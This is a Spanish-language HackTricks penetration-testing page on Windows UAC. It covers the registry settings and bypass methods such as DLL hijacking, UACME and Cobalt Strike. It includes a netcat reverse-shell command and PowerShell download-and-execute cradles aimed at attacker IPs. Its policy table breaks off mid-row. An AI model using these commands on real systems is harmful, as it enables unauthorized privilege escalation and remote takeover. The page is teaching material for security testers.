# UAC - Control de Cuentas de Usuario

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas de la comunidad más avanzadas del mundo.\
Obtén acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Control de Cuentas de Usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una función que permite una **solicitud de consentimiento para actividades elevadas**. Las aplicaciones tienen diferentes niveles de `integridad`, y un programa con un **nivel alto** puede realizar tareas que **podrían comprometer el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre se **ejecutan bajo el contexto de seguridad de una cuenta que no es de administrador** a menos que un administrador autorice explícitamente que estas aplicaciones/tareas tengan acceso de nivel de administrador al sistema para ejecutarse. Es una función de conveniencia que protege a los administradores de cambios no deseados, pero no se considera un límite de seguridad.

Para obtener más información sobre los niveles de integridad:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Cuando UAC está en su lugar, a un usuario administrador se le otorgan 2 tokens: una clave de usuario estándar, para realizar acciones regulares como nivel regular, y una con los privilegios de administrador.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute cómo funciona UAC en gran profundidad e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC. Los administradores pueden usar políticas de seguridad para configurar cómo funciona UAC específicamente para su organización a nivel local (usando secpol.msc), o configurado y distribuido a través de Objetos de Política de Grupo (GPO) en un entorno de dominio de Active Directory. Los diversos ajustes se discuten en detalle [aquí](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 ajustes de directiva de grupo que se pueden establecer para UAC. La siguiente tabla proporciona detalles adicionales:

| Configuración de directiva de grupo                                                                                                                                                                                                                                                                                                                                                   | Clave del registro            | Configuración predeterminada                                    |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------- | ---------------------------------------------------------------- |
| [Modo de aprobación de administrador de Control de cuentas de usuario para la cuenta de administrador integrada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account) | FilterAdministratorToken      | Deshabilitado                                                    |
| [Permitir que las aplicaciones de UIAccess soliciten elevación sin usar el escritorio seguro](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle        | Deshabilitado                                                    |
| [Comportamiento del cuadro de diálogo de elevación para administradores en el modo de aprobación de administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode) | ConsentPromptBehaviorAdmin    | Solicitar consentimiento para binarios que no sean de Windows     |
| [Comportamiento del cuadro de diálogo de elevación para usuarios estándar](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                 | ConsentPromptBehaviorUser     | Solicitar credenciales en el escritorio seguro                   |
| [Detectar instalaciones de aplicaciones y solicitar elevación](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                 | EnableInstallerDetection      | Habilitado (predeterminado para el hogar) Deshabilitado (predeterminado para la empresa) |
| [Solo elevar ejecutables que estén firmados y validados](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                                 | ValidateAdminCodeSignatures   | Deshabilitado                                                    |
| [Solo elevar aplicaciones de UIAccess que estén instaladas en ubicaciones seguras](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations) | EnableSecureUIAPaths          | Habilitado                                                       |
| [Ejecutar a todos los administradores en el modo de aprobación de administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                 | EnableLUA                     | Habilitado                                                       |
| [Cambiar al escritorio seguro al solicitar elevación](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                 | PromptOnSecureDesktop         | Habilitado                                                       |
| [
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```
Si el valor es **`1`**, entonces UAC está **activado**. Si el valor es **`0`** o **no existe**, entonces UAC está **inactivo**.

Luego, verifique **qué nivel** está configurado:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Si es **`0`**, entonces UAC no pedirá confirmación (como **deshabilitado**)
* Si es **`1`**, se le pedirá al administrador que ingrese su nombre de usuario y contraseña para ejecutar el binario con altos privilegios (en el Escritorio Seguro)
* Si es **`2`** (**Siempre notificarme**), UAC siempre pedirá confirmación al administrador cuando intente ejecutar algo con altos privilegios (en el Escritorio Seguro)
* Si es **`3`** es como `1` pero no es necesario en el Escritorio Seguro
* Si es **`4`** es como `2` pero no es necesario en el Escritorio Seguro
* Si es **`5`** (**predeterminado**), se le pedirá al administrador que confirme la ejecución de binarios no Windows con altos privilegios

Luego, debes revisar el valor de **`LocalAccountTokenFilterPolicy`**\
Si el valor es **`0`**, entonces solo el usuario RID 500 (**Administrador integrado**) puede realizar tareas de administrador sin UAC, y si es `1`, **todas las cuentas dentro del grupo "Administradores"** pueden hacerlo.

Y, finalmente, revisa el valor de la clave **`FilterAdministratorToken`**\
Si es **`0`** (predeterminado), la cuenta **Administrador integrado puede** realizar tareas de administración remota y si es **`1`**, la cuenta integrada Administrador **no puede** realizar tareas de administración remota, a menos que `LocalAccountTokenFilterPolicy` esté establecido en `1`.

#### Resumen

* Si `EnableLUA=0` o **no existe**, **no hay UAC para nadie**
* Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=1` , No hay UAC para nadie**
* Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=0`, No hay UAC para RID 500 (Administrador integrado)**
* Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=1`, UAC para todos**

Toda esta información se puede obtener utilizando el módulo de **metasploit**: `post/windows/gather/win_privs`

También puedes verificar los grupos de tu usuario y obtener el nivel de integridad:
```
net user %username%
whoami /groups | findstr Level
```
## Bypass de UAC

{% hint style="info" %}
Tenga en cuenta que si tiene acceso gráfico a la víctima, el bypass de UAC es sencillo, ya que simplemente puede hacer clic en "Sí" cuando aparezca el mensaje de UAC.
{% endhint %}

El bypass de UAC es necesario en la siguiente situación: **el UAC está activado, su proceso se está ejecutando en un contexto de integridad media y su usuario pertenece al grupo de administradores**.

Es importante mencionar que es **mucho más difícil saltarse el UAC si está en el nivel de seguridad más alto (Always) que si está en cualquiera de los otros niveles (Default).**

### UAC desactivado

Si UAC ya está desactivado (`ConsentPromptBehaviorAdmin` es **`0`**), puede **ejecutar una shell inversa con privilegios de administrador** (nivel de integridad alto) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Bypass de UAC con duplicación de token

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muy** básico bypass de UAC (acceso completo al sistema de archivos)

Si tienes una shell con un usuario que está dentro del grupo de Administradores, puedes **montar el recurso compartido C$** a través de SMB (sistema de archivos) localmente en un nuevo disco y tendrás **acceso a todo dentro del sistema de archivos** (incluso la carpeta de inicio del Administrador).

{% hint style="warning" %}
**Parece que este truco ya no funciona**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Bypass de UAC con cobalt strike

Las técnicas de Cobalt Strike solo funcionarán si UAC no está configurado en su nivel máximo de seguridad.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** y **Metasploit** también tienen varios módulos para **burlar** el **UAC**.

### Exploits de burla del UAC

[**UACME**](https://github.com/hfiref0x/UACME) es una **compilación** de varios exploits de burla del UAC. Tenga en cuenta que deberá **compilar UACME usando Visual Studio o MSBuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), deberá saber **cuál necesita**.\
Debe **tener cuidado** porque algunas burlas **provocarán que otros programas** alerten al **usuario** de que algo está sucediendo.

UACME tiene la **versión de compilación desde la cual cada técnica comenzó a funcionar**. Puede buscar una técnica que afecte a sus versiones:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Además, utilizando [esta](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) página, se obtiene la versión de Windows `1607` a partir de las versiones de compilación.

#### Más técnicas de bypass de UAC

**Todas** las técnicas utilizadas aquí para eludir UAC **requieren** una **shell interactiva completa** con la víctima (una shell común de nc.exe no es suficiente).

Puede obtenerse utilizando una sesión de **meterpreter**. Migrar a un **proceso** que tenga el valor de **Session** igual a **1**:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ debería funcionar)

### Bypass de UAC con GUI

Si tiene acceso a una **GUI, simplemente puede aceptar la solicitud de UAC** cuando la reciba, realmente no necesita un bypass. Por lo tanto, obtener acceso a una GUI le permitirá eludir el UAC.

Además, si obtiene una sesión de GUI que alguien estaba usando (potencialmente a través de RDP), hay **algunas herramientas que se ejecutarán como administrador** desde donde podría **ejecutar** un **cmd** por ejemplo **como administrador** directamente sin ser solicitado nuevamente por UAC como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Esto podría ser un poco más **sigiloso**.

### Bypass de UAC ruidoso por fuerza bruta

Si no le importa ser ruidoso, siempre puede **ejecutar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **solicita elevar los permisos hasta que el usuario los acepte**.

### Su propio bypass - Metodología básica de bypass de UAC

Si echa un vistazo a **UACME**, notará que **la mayoría de los bypasses de UAC abusan de una vulnerabilidad de secuestro de Dll** (principalmente escribiendo la dll maliciosa en _C:\Windows\System32_). [Lea esto para aprender cómo encontrar una vulnerabilidad de secuestro de Dll](../windows-local-privilege-escalation/dll-hijacking.md).

1. Encuentre un binario que se **autoeleve** (verifique que cuando se ejecute se ejecute en un nivel de integridad alto).
2. Con procmon, encuentre eventos de "**NOMBRE NO ENCONTRADO**" que puedan ser vulnerables al **secuestro de DLL**.
3. Probablemente necesitará **escribir** la DLL dentro de algunas **rutas protegidas** (como C:\Windows\System32) donde no tenga permisos de escritura. Puede eludir esto usando:
   1. **wusa.exe**: Windows 7,8 y 8.1. Permite extraer el contenido de un archivo CAB dentro de rutas protegidas (porque esta herramienta se ejecuta desde un nivel de integridad alto).
   2. **IFileOperation**: Windows 10.
4. Prepare un **script** para copiar su DLL dentro de la ruta protegida y ejecutar el binario vulnerable y autoelevado.

### Otra técnica de bypass de UAC

Consiste en observar si un binario **autoelevado** intenta **leer** del **registro** el **nombre/ruta** de un **binario** o **comando** que se va a **ejecutar** (esto es más interesante si el binario busca esta información dentro de **HKCU**).

![](<../../.gitbook/assets/image (9) (1) (2).png>)

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** impulsados por las herramientas de la comunidad más avanzadas del mundo.\
Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabaja en una **empresa de ciberseguridad**? ¿Quiere ver su **empresa anunciada en HackTricks**? ¿O quiere tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparta sus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
